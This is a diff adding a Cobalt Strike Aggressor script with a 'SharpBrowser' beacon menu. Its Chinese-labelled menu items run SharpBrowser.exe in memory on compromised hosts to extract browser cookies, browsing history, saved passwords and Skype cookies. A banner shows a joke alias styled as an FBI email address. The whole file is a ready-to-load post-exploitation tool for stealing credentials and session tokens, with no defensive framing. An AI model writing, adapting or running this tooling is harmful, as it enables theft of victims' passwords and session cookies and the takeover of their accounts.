@@ -1,0 +1,67 @@
+##############################
+#                            #
+#                            #
+#                            #
+#       H1d3r@Fbi.gov        #
+#                            #
+#                            #
+#                            #
+##############################
+popup beacon_bottom {
+    menu "SharpBrowser"{
+
+		item "提取以下全部信息"{
+			local('$bid');
+				foreach $bid ($1){
+					sharpchromeall($bid);
+				}
+			}
+
+		item "提取浏览器Cookies"{
+			local('$bid');
+				foreach $bid ($1){
+					sharpchromecookies($bid);
+				}
+			}
+
+		item "提取浏览器历史记录"{
+			local('$bid');
+				foreach $bid ($1){
+					sharphistory($bid);
+				}
+			}
+
+		item "提取保存的密码"{
+			local('$bid');
+				foreach $bid ($1){
+					sharplogins($bid);
+				}
+			}
+		item "提取skype的Cookie"{
+			local('$bid');
+				foreach $bid ($1){
+					sharpskype($bid);
+				}
+			}
+	sub sharpchromeall{
+		bexecute_assembly($1, script_resource('/SharpBrowser.exe'), "all");
+		}
+
+	sub sharpchromecookies{
+		bexecute_assembly($1, script_resource('/SharpBrowser.exe'), "cookies");
+		}
+
+	sub sharphistory{
+		bexecute_assembly($1, script_resource('/SharpBrowser.exe'), "history");
+		}
+
+	sub sharpskype{
+		bexecute_assembly($1, script_resource('/SharpBrowser.exe'), "cookies skype.com","skype.com");
+		}
+
+	sub sharplogins{
+		bexecute_assembly($1, script_resource('/SharpBrowser.exe'), "logins");
+		}
+
+    }
+}
